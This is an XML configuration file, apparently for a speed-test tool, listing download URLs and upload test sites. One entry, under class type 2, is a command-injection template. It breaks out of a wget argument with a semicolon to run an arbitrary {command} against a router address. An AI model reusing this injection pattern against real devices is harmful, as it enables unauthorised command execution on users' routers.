﻿<?xml version="1.0"?>
<root>
	<class type="1">
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
		<item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
	</class>
	<class type="2">
		<item url="http://{router_ip_address} -q -O /dev/null;{command};exit;wget http://{router_ip_address} "/>
	</class>
	<class type="3">
		<item uploadurl="http://www.taobao.com/"/>
		<item uploadurl="http://www.so.com/"/>
		<item uploadurl="http://www.qq.com/"/>
		<item uploadurl="http://www.sohu.com/"/>
		<item uploadurl="http://www.tudou.com/"/>
		<item uploadurl="http://www.360doc.com/"/>
		<item uploadurl="http://www.kankan.com/"/>
		<item uploadurl="http://www.speedtest.cn/"/>
	</class>
</root>
